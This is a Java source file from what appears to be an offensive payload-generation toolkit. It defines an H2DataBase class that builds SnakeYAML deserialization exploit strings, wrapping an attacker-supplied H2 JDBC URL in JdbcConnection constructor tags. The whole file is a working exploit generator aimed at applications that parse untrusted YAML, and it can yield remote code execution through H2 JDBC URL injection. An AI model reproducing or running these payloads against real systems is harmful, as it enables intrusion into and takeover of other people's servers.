package cn.butler.snakeyaml.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;

public class H2DataBase implements ObjectPayload<Object> {
    @Override
    public Object getObject(final String command) throws Exception {
        String[] parts = command.split(":", 2);
        String gadget = parts[0];
        String payload = parts[1];
        String h2_url = (String)ObjectPayload.Utils.makePayloadObject("JdbcAttack",gadget, payload);

        String escaped_h2_url = h2_url
            .replace("\\", "\\\\")  // 转义反斜杠 \ → \\
            .replace("\"", "\\\"");  // 转义双引号 " → \"

        String exp1 = "!!org.h2.jdbc.JdbcConnection [\"" + escaped_h2_url + "\", !!java.util.Properties []]";
        String exp2 = "!!org.h2.jdbc.JdbcConnection [\"" + escaped_h2_url + "\", !!java.util.Properties [], \"a\", \"b\", false]";

        return exp1 + "\n" + exp2;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(H2DataBase.class, args);
    }
}
